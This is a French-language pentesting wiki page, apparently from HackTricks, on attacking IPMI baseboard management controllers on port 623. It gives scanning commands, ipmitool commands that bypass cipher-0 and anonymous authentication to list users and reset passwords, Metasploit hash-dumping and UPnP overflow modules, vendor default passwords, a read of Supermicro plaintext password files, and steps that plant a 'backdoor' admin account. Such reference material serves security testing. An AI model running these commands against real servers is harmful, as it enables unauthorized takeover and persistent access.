# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

### **Overview of IPMI**

**[Interface de gestion de plateforme intelligente (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)** offre une approche standardis√©e pour la gestion et la surveillance √† distance des syst√®mes informatiques, ind√©pendamment du syst√®me d'exploitation ou de l'√©tat d'alimentation. Cette technologie permet aux administrateurs syst√®me de g√©rer les syst√®mes √† distance, m√™me lorsqu'ils sont √©teints ou non r√©actifs, et est particuli√®rement utile pour :

- Configurations de d√©marrage pr√©-OS
- Gestion de l'alimentation
- R√©cup√©ration apr√®s des pannes syst√®me

IPMI est capable de surveiller les temp√©ratures, les tensions, les vitesses des ventilateurs et les alimentations, tout en fournissant des informations d'inventaire, en examinant les journaux mat√©riels et en envoyant des alertes via SNMP. Essentiel √† son fonctionnement, il n√©cessite une source d'alimentation et une connexion LAN.

Depuis son introduction par Intel en 1998, IPMI a √©t√© soutenu par de nombreux fournisseurs, am√©liorant les capacit√©s de gestion √† distance, notamment avec le support de la version 2.0 pour le s√©rie sur LAN. Les composants cl√©s incluent :

- **Contr√¥leur de gestion de carte m√®re (BMC) :** Le micro-contr√¥leur principal pour les op√©rations IPMI.
- **Bus et interfaces de communication :** Pour la communication interne et externe, y compris ICMB, IPMB et diverses interfaces pour les connexions locales et r√©seau.
- **M√©moire IPMI :** Pour stocker les journaux et les donn√©es.

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**Port par d√©faut** : 623/UDP/TCP (Il est g√©n√©ralement sur UDP mais peut √©galement fonctionner sur TCP)

## Enumeration

### Discovery
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
Vous pouvez **identifier** la **version** en utilisant :
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### IPMI Vulnerabilities

Dans le domaine de l'IPMI 2.0, une faille de s√©curit√© significative a √©t√© d√©couverte par Dan Farmer, exposant une vuln√©rabilit√© √† travers **cipher type 0**. Cette vuln√©rabilit√©, document√©e en d√©tail dans [la recherche de Dan Farmer](http://fish2.com/ipmi/cipherzero.html), permet un acc√®s non autoris√© avec n'importe quel mot de passe, √† condition qu'un utilisateur valide soit cibl√©. Cette faiblesse a √©t√© trouv√©e dans divers BMC de fabricants tels que HP, Dell et Supermicro, sugg√©rant un probl√®me g√©n√©ralis√© au sein de toutes les impl√©mentations IPMI 2.0.

### **IPMI Authentication Bypass via Cipher 0**

Pour d√©tecter cette faille, le scanner auxiliaire Metasploit suivant peut √™tre utilis√© :
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
L'exploitation de cette faille est r√©alisable avec `ipmitool`, comme d√©montr√© ci-dessous, permettant la liste et la modification des mots de passe des utilisateurs :
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **R√©cup√©ration de hachages de mots de passe √† distance RAKP d'IPMI 2.0**

Cette vuln√©rabilit√© permet la r√©cup√©ration de mots de passe hach√©s sal√©s (MD5 et SHA1) pour tout nom d'utilisateur existant. Pour tester cette vuln√©rabilit√©, Metasploit propose un module :
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **Authentification Anonyme IPMI**

Une configuration par d√©faut dans de nombreux BMC permet un acc√®s "anonyme", caract√©ris√© par des cha√Ænes de nom d'utilisateur et de mot de passe nulles. Cette configuration peut √™tre exploit√©e pour r√©initialiser les mots de passe des comptes d'utilisateur nomm√©s en utilisant `ipmitool`:
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Supermicro IPMI Mots de passe en clair**

Un choix de conception critique dans IPMI 2.0 n√©cessite le stockage de mots de passe en clair au sein des BMC pour des raisons d'authentification. Le stockage de ces mots de passe par Supermicro dans des emplacements tels que `/nv/PSBlock` ou `/nv/PSStore` soul√®ve d'importantes pr√©occupations en mati√®re de s√©curit√© :
```bash
cat /nv/PSBlock
```
### **Vuln√©rabilit√© UPnP IPMI de Supermicro**

L'inclusion par Supermicro d'un √©couteur SSDP UPnP dans son firmware IPMI, en particulier sur le port UDP 1900, introduit un risque de s√©curit√© s√©v√®re. Les vuln√©rabilit√©s dans le SDK Intel pour les dispositifs UPnP version 1.3.1, comme d√©taill√© par [la divulgation de Rapid7](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play), permettent un acc√®s root au BMC :
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Brute Force

**HP randomise le mot de passe par d√©faut** pour son produit **Integrated Lights Out (iLO)** lors de la fabrication. Cette pratique contraste avec d'autres fabricants, qui ont tendance √† utiliser des **identifiants par d√©faut statiques**. Un r√©sum√© des noms d'utilisateur et mots de passe par d√©faut pour divers produits est fourni comme suit :

- **HP Integrated Lights Out (iLO)** utilise une **cha√Æne de 8 caract√®res randomis√©e en usine** comme mot de passe par d√©faut, montrant un niveau de s√©curit√© plus √©lev√©.
- Des produits comme **Dell's iDRAC, IBM's IMM**, et **Fujitsu's Integrated Remote Management Controller** utilisent des mots de passe facilement devinables tels que "calvin", "PASSW0RD" (avec un z√©ro), et "admin" respectivement.
- De m√™me, **Supermicro IPMI (2.0), Oracle/Sun ILOM**, et **ASUS iKVM BMC** utilisent √©galement des identifiants par d√©faut simples, avec "ADMIN", "changeme", et "admin" servant de mots de passe.


## Acc√©der √† l'h√¥te via BMC

L'acc√®s administratif au Baseboard Management Controller (BMC) ouvre diverses voies pour acc√©der au syst√®me d'exploitation de l'h√¥te. Une approche simple consiste √† exploiter la fonctionnalit√© KVM (Keyboard, Video, Mouse) du BMC. Cela peut √™tre fait en red√©marrant l'h√¥te vers un shell root via GRUB (en utilisant `init=/bin/sh`) ou en d√©marrant √† partir d'un CD-ROM virtuel configur√© comme disque de secours. De telles m√©thodes permettent une manipulation directe du disque de l'h√¥te, y compris l'insertion de portes d√©rob√©es, l'extraction de donn√©es, ou toute action n√©cessaire pour une √©valuation de s√©curit√©. Cependant, cela n√©cessite de red√©marrer l'h√¥te, ce qui est un inconv√©nient majeur. Sans red√©marrage, acc√©der √† l'h√¥te en cours d'ex√©cution est plus complexe et varie selon la configuration de l'h√¥te. Si la console physique ou s√©rie de l'h√¥te reste connect√©e, elle peut facilement √™tre prise en charge via les fonctionnalit√©s KVM ou serial-over-LAN (sol) du BMC via `ipmitool`. Explorer l'exploitation des ressources mat√©rielles partag√©es, comme le bus i2c et la puce Super I/O, est un domaine qui n√©cessite une enqu√™te plus approfondie.

## Introduction de portes d√©rob√©es dans le BMC depuis l'h√¥te

Apr√®s avoir compromis un h√¥te √©quip√© d'un BMC, l'**interface BMC locale peut √™tre exploit√©e pour ins√©rer un compte utilisateur porte d√©rob√©e**, cr√©ant une pr√©sence durable sur le serveur. Cette attaque n√©cessite la pr√©sence de **`ipmitool`** sur l'h√¥te compromis et l'activation du support du pilote BMC. Les commandes suivantes illustrent comment un nouveau compte utilisateur peut √™tre inject√© dans le BMC en utilisant l'interface locale de l'h√¥te, ce qui contourne le besoin d'authentification. Cette technique est applicable √† un large √©ventail de syst√®mes d'exploitation, y compris Linux, Windows, BSD, et m√™me DOS.
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## R√©f√©rences

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
